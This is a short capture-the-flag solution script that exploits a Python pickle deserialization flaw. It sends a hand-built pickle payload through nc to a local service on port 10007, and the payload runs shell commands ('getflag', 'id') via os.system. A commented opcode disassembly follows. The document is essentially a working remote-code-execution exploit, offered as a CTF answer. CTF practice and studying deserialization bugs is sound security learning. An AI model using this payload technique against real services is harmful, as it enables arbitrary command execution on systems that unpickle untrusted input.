# Solution by Farzad E. (me@dNetGuru.com)  / @dNetGuru

echo -e "cos\nsystem\n(S'getflag>/tmp/dFlag;id>>/tmp/dFlag'\ntR." | nc localhost 10007

#Note: Disassembly
#    0: c    GLOBAL     'os system'
#   11: (    MARK
#   12: S        STRING     'getflag>/tmp/dFlag;id>>/tmp/dFlag'
#   49: t        TUPLE      (MARK at 11)
#   50: R    REDUCE
#   51: .    STOP
